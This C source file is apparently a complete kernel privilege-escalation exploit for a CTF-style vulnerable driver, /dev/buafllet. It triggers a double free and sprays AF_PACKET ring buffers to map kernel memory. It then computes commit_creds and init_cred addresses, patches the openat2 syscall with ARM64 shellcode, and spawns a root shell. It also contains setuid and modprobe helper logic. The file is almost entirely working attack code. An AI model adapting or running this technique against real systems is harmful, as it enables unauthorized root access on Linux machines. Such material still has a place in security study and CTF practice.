#define _GNU_SOURCE
#include <syscall.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <string.h>
#include <sys/timerfd.h>
#include <sched.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <netpacket/packet.h>

struct args_create
{
    size_t size;
};
struct args_switch
{
    long index;
};

struct
{
    long mtype;
    char mtext[48];
} msg;
struct
{
    long mtype;
    char mtext[48];
} msg2;

#define IOCTL_CREATE 0x10
#define IOCTL_FREE 0x11
#define IOCTL_READ 0x12
#define IOCTL_WRITE 0x13

int vulnfd;

void hexdump(char *addr, size_t size)
{
    for (size_t i = 0; i < size; i += 8)
    {
        printf("+%#04llx %#018llx\n", i, *(uint64_t *)(addr + i));
    }
}

int create_bullet(size_t size)
{
    return ioctl(vulnfd, IOCTL_CREATE, &size);
}
int free_bullet()
{
    return ioctl(vulnfd, IOCTL_FREE);
}
int read_bullet(char *data)
{
    return ioctl(vulnfd, IOCTL_READ, data);
}
int write_bullet(char *data)
{
    return ioctl(vulnfd, IOCTL_WRITE, data);
}

uint64_t empty[0x100] = {};

void init(int argc, char **argv)
{
    if (argc >= 2 && !strcmp(argv[1], "shell"))
    {
        setreuid(geteuid(), geteuid());
        system("/bin/sh");
        exit(0);
    }
    if (geteuid() == 0) // modprobe
    {

        chown("/exploit/exploit", 0, 0);
        chmod("/exploit/exploit", 04777);
        system("touch /tmp/grass");
        exit(0);
    }

    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(0, &cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu))
    {
        perror("sched_setaffinity");
        exit(-1);
    }

    vulnfd = open("/dev/buafllet", O_RDWR);
    if (vulnfd == -1)
    {
        perror("open");
        exit(-1);
    }
}

struct tpacket_req3
{
    unsigned int tp_block_size;     /* Minimal size of contiguous block */
    unsigned int tp_block_nr;       /* Number of blocks */
    unsigned int tp_frame_size;     /* Size of frame */
    unsigned int tp_frame_nr;       /* Total number of frames */
    unsigned int tp_retire_blk_tov; /* timeout in msecs */
    unsigned int tp_sizeof_priv;    /* offset to private data area */
    unsigned int tp_feature_req_word;
};

enum tpacket_versions
{
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3
};

int spray_pg_vec(uint64_t size)
{
    int s = socket(AF_PACKET, SOCK_RAW, 0);
    int pkt_ver = TPACKET_V3;
    uint32_t blocksiz = 0x1000, framesiz = 0x1000 / 2;
    setsockopt(s, SOL_PACKET, PACKET_VERSION, &pkt_ver, sizeof(pkt_ver));

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = blocksiz;
    req.tp_frame_size = framesiz;
    req.tp_block_nr = size / 8;
    req.tp_frame_nr = (blocksiz * (size / 8)) / framesiz;
    req.tp_retire_blk_tov = 0xffffffff;
    req.tp_sizeof_priv = 0;
    req.tp_feature_req_word = 0;

    setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));

    return s;
}

char* shared;

int main(int argc, char **argv)
{
    char shellcode[] = {0x00, 0x01, 0x00, 0x10, 0x00, 0x00, 0x40, 0xF9, 0x88, 0x00, 0x00, 0x10, 0x08, 0x01, 0x40, 0xF9, 0x00, 0x01, 0x1F, 0xD6, 0xC0, 0x03, 0x5F, 0xD6, 0x48, 0x47, 0x46, 0x45, 0x44, 0x43, 0x42, 0x41, 0x37, 0x36, 0x35, 0x34, 0x33, 0x32, 0x31, 0x30};
    char buffer[0x400] = {};
    init(argc, argv);

    if (argc < 2)
    {
        printf("%d\n", create_bullet(0x500));
        // getchar();
        printf("%d\n", free_bullet());
        if (!fork())
        {
            printf("%d\n", free_bullet());
            exit(0);
        }
    }

    memset(buffer, 'A', 0x80);
    write_bullet(buffer);

    char *modprobe_addr;
    printf("kernel (x21): ");
    fflush(stdout);
    fgets(buffer, 0x20, stdin);
    sscanf(buffer, "%llx\n", &modprobe_addr);
    modprobe_addr += 0x8b1fc;
    modprobe_addr -= 0x21caa88;
    printf("modprobe: %p\n", modprobe_addr);

    shared = mmap(NULL, 0x1000, 7, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    printf("shared: %p\n", shared);

    int pid = fork();
    if (!pid)
    {
        unshare(CLONE_NEWUSER);
        unshare(CLONE_NEWNET);

        int sockets[0x20 * 0x10];
        for (int j = 0; j < 1; j++)
        {
            for (int i = 0; i < 0x10; i++)
            {
                sockets[i] = spray_pg_vec(0x500);
            }
        }

        sleep(1);
        printf("socket: %d\n", sockets[0]);

        // struct itimerspec timerspec = {};
        // timerspec.it_interval.tv_sec = 0;
        // timerspec.it_interval.tv_nsec = 0;
        // timerspec.it_value.tv_sec = 1;
        // timerspec.it_value.tv_nsec = 0;
        // int timerfds[0x100];
        // for (int i = 0; i < 0x100; i++)
        // {
        //     timerfds[i] = timerfd_create(CLOCK_REALTIME, 0);
        //     timerfd_settime(timerfds[i], 0, &timerspec, NULL);
        // }
        // sleep(1);

        // getchar();

        printf("%d\n", read_bullet(buffer));
        hexdump(buffer, 0x400);
        // getchar();
        assert(memcmp(buffer, "AAAAAAAA", 8) != 0);

        char *tmp = *(uint64_t *)buffer;
        *(uint64_t *)buffer = (uint64_t)modprobe_addr & ~0xfff;
        write_bullet(buffer);

        printf("%d\n", read_bullet(buffer));
        hexdump(buffer, 0x400);

        char *addrs[0x10];
        for (int i = 0; i < 0x10; i++)
        {
            addrs[i] = mmap(NULL, ((0x500 / 8) * 0x1000), 7, MAP_SHARED, sockets[i], 0);
            printf("%#x: %p\n", i, addrs[i]);
        }


        assert(addrs[0][0x2b8] == 0x3f);

        // puts(addrs[0] + 0xd40);
        // printf("len: %d\n", strlen(addrs[0] + 0xd40));
        // assert(strlen(addrs[0] + 0xd40) > 2);

        hexdump(addrs[0], 0x1000);

        printf("openat2: %p", modprobe_addr + 0x2b8);
        printf("commit_creds: %p", modprobe_addr - 0x211a30);
        printf("init_cred: %p", modprobe_addr + 0x2154380);

        ((uint64_t*)shellcode)[3] = modprobe_addr - 0x211a30;
        ((uint64_t*)shellcode)[4] = modprobe_addr + 0x2154380;

        memcpy(addrs[0] + 0x2b8, shellcode, sizeof(shellcode));

        // strcpy(addrs[0] + 0xd40, "/exploit/exploit");
        *shared = 1;
        while (1)
        {
            sleep(10);
        }
        exit(0);
    }


    // system("/tmp/bob");

    while (*shared == 0);
    
    puts("OPENAT2");
    getchar();
    syscall(437);

    // system("echo -ne '\xff\xff\xff\xff' > /tmp/bob");
    // system("chmod +x /tmp/bob");
    system("/bin/sh");

    puts("exit");
    getchar();
    exit(0);
}